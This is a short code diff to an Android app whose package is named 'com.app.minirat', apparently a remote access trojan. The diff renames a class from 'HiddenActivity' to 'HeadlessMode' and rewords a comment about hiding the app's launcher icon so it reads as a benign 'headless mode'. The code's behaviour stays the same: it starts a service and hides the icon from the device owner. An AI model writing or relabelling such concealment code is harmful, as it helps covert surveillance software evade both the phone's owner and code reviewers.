@@ -9,7 +9,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.view.WindowManager;
 
-public class HiddenActivity extends Activity {
+public class HeadlessMode extends Activity {
     private static final int PERMISSION_REQUEST_CODE = 100;
 
     @Override
@@ -80,7 +80,7 @@ public class HiddenActivity extends Activity {
             startService(serviceIntent);
         }
 
-        // Hide app icon by disabling the launcher alias
+        // Switch to headless mode — disable launcher alias
         ComponentName alias = new ComponentName(this, "com.app.minirat.LauncherAlias");
         getPackageManager().setComponentEnabledSetting(
                 alias,
